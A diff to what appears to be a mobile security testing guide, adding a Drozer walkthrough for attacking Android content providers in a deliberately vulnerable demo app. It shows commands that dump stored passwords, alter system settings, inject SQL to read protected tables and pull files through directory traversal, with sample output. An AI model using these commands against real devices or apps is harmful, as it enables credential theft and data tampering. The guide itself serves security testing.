@@ -577,18 +577,156 @@ private void vulnerableBroadcastFunction() {
 
 #### Dynamic Analysis
 
-Similar to White-box testing, you should decompile the application (if possible) and create a list of IPC mechanisms implemented by going through the AndroidManifest.xml file. Once you have the list, prove each IPC via ADB or custom applications to see if they leak any sensitive information.
+##### Testing Content Providers
 
-* Vulnerable ContentProvider
+To begin dynamic analysis of an application's content providers, you should first enumerate the attack surface. This can be achieved using the Drozer module `app.provider.info`:
 
-In the case of the previous content provider, we can probe the content provider via ADB, but we need to know the correct URI. Once the APK has been decompiled, use the commands `strings` and `grep` to identify the correct URI to use:
-
-```bash
-$ strings classes.dex | grep "content://"
-com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
+```
+dz> run app.provider.info -a com.mwr.example.sieve
+  Package: com.mwr.example.sieve
+  Authority: com.mwr.example.sieve.DBContentProvider
+  Read Permission: null
+  Write Permission: null
+  Content Provider: com.mwr.example.sieve.DBContentProvider
+  Multiprocess Allowed: True
+  Grant Uri Permissions: False
+  Path Permissions:
+  Path: /Keys
+  Type: PATTERN_LITERAL
+  Read Permission: com.mwr.example.sieve.READ_KEYS
+  Write Permission: com.mwr.example.sieve.WRITE_KEYS
+  Authority: com.mwr.example.sieve.FileBackupProvider
+  Read Permission: null
+  Write Permission: null
+  Content Provider: com.mwr.example.sieve.FileBackupProvider
+  Multiprocess Allowed: True
+  Grant Uri Permissions: False
 ```
 
-Now you can probe the content provider via `adb` with the following command:
+In the example, two content providers are exported, each not requiring any permission to interact with them, except for the `/Keys` path in the `DBContentProvider`. Using this information you can reconstruct part of the content URIs to access the `DBContentProvider`, because it is known that they must begin with `content://`. However, the full content provider URI is not currently known.
+
+To identify content provider URIs within the appliation, Drozer's `scanner.provider.finduris` module should be used. This utilizes various techniques to guess paths and determine a list of accessible content URIs:
+
+```
+dz> run scanner.provider.finduris -a com.mwr.example.sieve
+Scanning com.mwr.example.sieve...
+Unable to Query content://com.mwr.
+example.sieve.DBContentProvider/
+...
+Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
+Accessible content URIs:
+content://com.mwr.example.sieve.DBContentProvider/Keys/
+content://com.mwr.example.sieve.DBContentProvider/Passwords
+content://com.mwr.example.sieve.DBContentProvider/Passwords/
+```
+
+Now that you have a list of accessible content providers, the next step is to attempt to extract data from each provider, which can be achieved using the `app.provider.query` module:
+
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+_id: 1
+service: Email
+username: incognitoguy50
+password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64
+-
+encoded)
+email: incognitoguy50@gmail.com
+```
+
+In addition to querying data, Drozer can be used to update, insert and delete records from a vulnerable content provider:
+
+* Insert record
+
+```
+dz> run app.provider.insert content://com.vulnerable.im/messages
+                --string date 1331763850325
+                --string type 0
+                --integer _id 7
+```
+
+* Update record
+
+```
+dz> run app.provider.update content://settings/secure
+                --selection "name=?"
+                --selection-args assisted_gps_enabled
+                --integer value 0
+```
+
+* Delete record
+
+```
+dz> run app.provider.delete content://settings/secure
+                --selection "name=?"
+                --selection-args my_setting
+```
+
+##### SQL Injection in Content Providers
+
+The Android platform promotes the use of SQLite databases for storing user data. Since these databases use SQL, they can be vulnerable to SQL injection. The Drozer module `app.provider.query` can be used to test for SQL injection by manipulating the projection and selection fields that are passed to the content provider:
+
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
+unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
+
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
+unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
+```
+
+If vulnerable to SQL Injection, the application will return a verbose error message. SQL Injection in Android can be exploited to modify or query data from the vulnerable content provider. In the following example, the Drozer module `app.provider.query` is used to list all tables in the database:
+
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
+FROM SQLITE_MASTER WHERE type='table';--" 
+| type  | name             | tbl_name         | rootpage | sql              |
+| table | android_metadata | android_metadata | 3        | CREATE TABLE ... | 
+| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
+| table | Key              | Key              | 5        | CREATE TABLE ... |
+```
+
+SQL Injection can also be exploited to retrieve data from otherwise protected tables:
+
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
+| Password | pin |
+| thisismypassword | 9876 |
+```
+
+These steps can be automated by using the `scanner.provider.injection` module, which automatically finds vulnerable content providers within an app:
+
+```
+dz> run scanner.provider.injection -a com.mwr.example.sieve 
+Scanning com.mwr.example.sieve... 
+Injection in Projection:
+  content://com.mwr.example.sieve.DBContentProvider/Keys/
+  content://com.mwr.example.sieve.DBContentProvider/Passwords
+  content://com.mwr.example.sieve.DBContentProvider/Passwords/
+Injection in Selection:
+  content://com.mwr.example.sieve.DBContentProvider/Keys/
+  content://com.mwr.example.sieve.DBContentProvider/Passwords
+  content://com.mwr.example.sieve.DBContentProvider/Passwords/
+```
+
+##### File System Based Content Providers
+
+A content provider can provide access to the underlying file system. This allows apps to share files, where the Android sandbox would otherwise prevent it. The Drozer modules `app.provider.read` and `app.provider.download` can be used to read or download files from exported file based content providers. These content providers can be susceptible to directory traversal vulnerabilities, making it possible to read otherwise protected files within the target application's sandbox.
+
+```
+dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
+Written 24488 bytes 
+```
+
+To automate the process of finding content providers susceptible to directory traversal, the `scanner.provider.traversal` module should be used:
+
+```
+dz> run scanner.provider.traversal -a com.mwr.example.sieve 
+Scanning com.mwr.example.sieve... 
+Vulnerable Providers:
+  content://com.mwr.example.sieve.FileBackupProvider/
+  content://com.mwr.example.sieve.FileBackupProvider
+```
+
+Note that `adb` can also be used to query content providers on a device:
 
 ```bash
 $ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
@@ -596,10 +734,10 @@ Row: 0 id=1, username=admin, password=StrongPwd
 Row: 1 id=2, username=test, password=test
 ...
 ```
-* Vulnerable Broadcast
+
+##### Vulnerable Broadcasts
 
 To sniff intents install and run the application on a device (actual device or emulated device) and use tools like Drozer or Intent Sniffer to capture intents and broadcast messages.
-
 
 #### Remediation
 
@@ -679,8 +817,6 @@ In order to prevent leaking of passwords or pins, sensitive information should b
 
 ##### CWE
 - CWE-200 - Information Exposure
-
-
 
 ### Testing for Sensitive Data in Backups
 
